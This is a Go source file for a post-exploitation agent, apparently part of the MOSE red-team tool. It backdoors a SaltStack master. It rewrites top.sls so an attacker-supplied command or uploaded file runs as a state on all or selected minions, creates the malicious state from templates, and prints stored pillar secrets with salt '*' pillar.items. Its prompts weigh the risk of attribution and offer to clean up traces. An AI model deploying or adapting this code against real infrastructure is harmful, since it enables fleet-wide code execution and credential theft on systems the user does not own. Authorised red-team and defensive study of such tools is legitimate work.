package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/CrimsonK1ng/mose/pkg/moseutils"
	"github.com/fatih/color"
	"github.com/ghodss/yaml"
	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
)

type Command struct {
	Cmd       string
	FileName  string
	StateName string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	bdCmd            = a.Cmd
	debug            = a.Debug
	errmsg           = color.Red
	localIP          = a.LocalIP
	msg              = color.Green
	osTarget         = a.OsTarget
	saltState        = a.PayloadName
	uploadFileName   = a.FileName
	suppliedFilename string
	keys             []string
	inspect          bool
	uploadFilePath   = a.RemoteUploadFilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
	saltBackupLoc    = a.SaltBackupLoc
	specific         bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.BoolVar(&specific, "s", false, "Specify which environments of the top.sls you would like to backdoor")
}

// backdoorTop backdoors the top.sls file found from searching the file system
// topLoc is the filepath to the top.sls file on the system
// This method will prompt the user for injection points into the top.sls
func backdoorTop(topLoc string) {
	bytes, err := moseutils.ReadBytesFromFile(topLoc)
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	var unmarshalled map[string]interface{}
	err = yaml.Unmarshal(bytes, &unmarshalled)
	if err != nil {
		log.Fatal(err)
	}
	//I am going to prompt questions before hand because reiterating through this is a monster
	ans, err := moseutils.AskUserQuestion("Would you like to inject all layers?", a.OsTarget)
	if err != nil {
		log.Fatalf("Quitting...")
	}
	injectAll := ans

	ans, err = moseutils.AskUserQuestion("Would you like to add  all to layers if no '*' is found?", a.OsTarget)
	if err != nil {
		log.Fatalf("Quitting...")
	}
	addAllIfNone := ans

	// mapOfInjects will be a hashmap of hashmaps that point to what host and what fileroot we want to inject
	unmarshalled, mapOfInjects := injectYaml(unmarshalled, injectAll, addAllIfNone, nil)

	if injectAll || addAllIfNone {
		return
	}

	validIndex := make(map[int]bool, 0)
	log.Println("Specific injection method requested, displaying indicies to select")
	for k, v := range mapOfInjects {
		ind := 0
		for k1, _ := range v {
			moseutils.Msg(fmt.Sprintf("[%d] Fileroot: %v Hosts: %v", ind, k, k1))
			validIndex[ind] = true
			ind += 1
		}
	}
	//log.Println(unmarshalled)
	if ans, err := moseutils.AskUserQuestionCommaIndex("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validIndex); err == nil {
		// Need to take the responses and then inject
		for ind, _ := range ans {
			fileroot, hosts := getIndexInjects(mapOfInjects, ind)
			if fileroot == "" || hosts == "" {
				log.Fatal("Error locating index provided by user...")
			}
			// mark the injection point as true
			mapOfInjects[fileroot][hosts] = true
		}
	} else if err != nil {
		log.Fatalf("Quitting...")
	}

	unmarshalled, _ = injectYaml(unmarshalled, false, false, mapOfInjects)

	writeYamlToTop(unmarshalled, topLoc)
}

/*
	site.yml looks like this:
	---
	file_roots: //optional header to make my life miserable
	  base: //this is the fileroot (base is the default for salt, others are defined elsewhere)
	    '*': // I call this hosts to run on
		  - state
*/
// injextYaml takes the unmarshalled yaml structure and unpacks it into structures we can use.
// injectAll if we should inject all hosts irregardless of type
// addAllIfNone similar to injectAll but if '*' is not found then we will create one in the fileroot for you
// injectionMap (optional) if provided then we have specific fileroots and hosts that the user would like to inject. If none then we build the map for prompting the user.
func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNone bool, injectionMap map[string]map[string]bool) (map[string]interface{}, map[string]map[string]bool) {
	var injectPointsCreate map[string]map[string]bool
	if injectionMap == nil {
		injectPointsCreate = make(map[string]map[string]bool)
	}

	for k, v := range unmarshalled { //k is the fileroot if file_roots is not in the file
		if k == "file_roots" { // There are two general cases for the top.sls. You can have a root element file_roots (optional)
			for fileroot, frv := range v.(map[string]interface{}) { // unpack the fileroot such as base: interface{}
				isAllFound := false

				if injectionMap == nil {
					injectPointsCreate[fileroot] = make(map[string]bool)
				}
				for hosts, _ := range frv.(map[string]interface{}) { //now unpack the hosts it will run on: '*': interface{}
					if hosts == "'*'" { //check if all case exists
						isAllFound = true
					}
					if injectAll { //now if this is set we just inject irregardless of host
						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
					}
					//Add hosts to the injection Points
					if injectionMap == nil {
						injectPointsCreate[fileroot][hosts] = true
					} else if injectionMap[fileroot][hosts] {
						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
					}
				}
				if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc..
					unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})["*"] = []string{saltState}
				}
			}
		} else {
			isAllFound := false
			if injectionMap == nil {
				injectPointsCreate[k] = make(map[string]bool)
			}
			for hosts, _ := range v.(map[string]interface{}) {
				if hosts == "'*'" { //check if all case exists
					isAllFound = true
				}
				if injectAll { // append to list of states to apply
					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
				}
				//Add hosts to the injection Points
				if injectionMap == nil {
					injectPointsCreate[k][hosts] = false
				} else if injectionMap[k][hosts] {
					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
				}

			}
			if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc...
				unmarshalled[k].(map[string]interface{})["*"] = []string{saltState}
			}
		}
	}
	return unmarshalled, injectPointsCreate
}

// createState Creates the state that we provided during mose buidl
// topLoc is the full path to top.sls
// cmd is the command string to run if uploadFileName is not provided to agent.go
func createState(topLoc string, cmd string) {
	topLocPath := filepath.Dir(topLoc) //Get directory leading to top.sls
	stateFolderLoc := filepath.Join(topLocPath, saltState)
	stateFolders := []string{stateFolderLoc}

	stateFilePath := filepath.Join(topLocPath, saltState, saltState+".sls")

	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
		msg("Successfully created the %s state at %s", saltState, stateFilePath)
		msg("Adding folder %s to cleanup file", stateFolderLoc)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
		if uploadFileName != "" {
			saltFileFolders := filepath.Join(stateFolderLoc, "files")

			moseutils.CreateFolders([]string{saltFileFolders})
			log.Printf("Copying  %s to module location %s", uploadFileName, saltFileFolders)
			moseutils.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			log.Printf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatalf("Failed to create %s state", saltState)
	}
}

// generateState creates the file from the templates in Mose
func generateState(stateFile string, cmd string, stateName string) bool {
	saltCommands := Command{
		Cmd:       bdCmd,
		FileName:  uploadFileName,
		StateName: stateName,
	}

	box := packr.New("Salt", "../../../templates/salt")

	s, err := box.FindString("saltState.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("saltFileUploadState.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("saltState").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(stateFile)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, saltCommands)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

// doCleanup will remove all backup files and files created on the system from running mose
// siteLoc is the location of the top.sls
func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		log.Printf("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

// backupSite creates backup of top.sls
func backupSite(siteLoc string) {
	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(siteLoc, path+".bak.mose")
		return
	}
	log.Printf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
	return
}

// writeYamlToTop takes unmarshalled data and file location and writes the finalized structure to fileLoc
// topSlsYaml unmarshalled data
// fileLoc location to write Marshalled data to
func writeYamlToTop(topSlsYaml map[string]interface{}, fileLoc string) {
	marshalled, err := yaml.Marshal(&topSlsYaml)
	if err != nil {
		log.Fatal(err)
	}

	err = moseutils.WriteFile(fileLoc, marshalled, 0644)
	if err != nil {
		log.Fatalf("error: %v", err)
	}
	log.Printf("%s successfully created", fileLoc)
}

// getIndexInjects returns the key, value pairing for indexing into the unmarshalled data structure above
// mapOfInjects is the map made during initial traversing through the generic map[string]interface{}
// index is the index selected and validated by the method AskUserQuestionCommaIndex
func getIndexInjects(mapOfInjects map[string]map[string]bool, index int) (string, string) {
	for k, v := range mapOfInjects {
		ind := 0
		for k1, _ := range v {
			if ind == index {
				return k, k1
			}
			ind += 1
		}
	}
	return "", ""
}

// getPillarSecrets tries to print out the pillar.items
// binLoc is the path to salt binary
func getPillarSecrets(binLoc string) {
	//Running command salt '*' pillar.items
	res, err := utils.RunCommand(binLoc, "*", "pillar.items")
	if err != nil {
		log.Printf("Error running command: %s '*' pillar.items", binLoc)
		log.Fatal(err)
	}
	msg("%s", res)

	return
}

func main() {
	// parse args
	flag.Parse()

	// gonna assume not root then we screwed
	utils.CheckRoot()

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	found, binLoc := moseutils.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Fatalf("salt binary not found, exiting...")
	}
	found, topLoc := moseutils.FindFile("top.sls", []string{"/srv/salt"})
	if !found {
		log.Fatalf("top.sls not found, exiting...")
	}

	if cleanup {
		doCleanup(topLoc)
	}
	if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
		backupSite(topLoc)
	} else if err != nil {
		log.Fatalf("Error backing up %s: %v, exiting...", topLoc, err)
	}

	msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
	backdoorTop(topLoc)
	createState(topLoc, bdCmd)

	log.Println("Attempting to find secrets stored with salt Pillars")
	getPillarSecrets(strings.TrimSpace(binLoc))
}
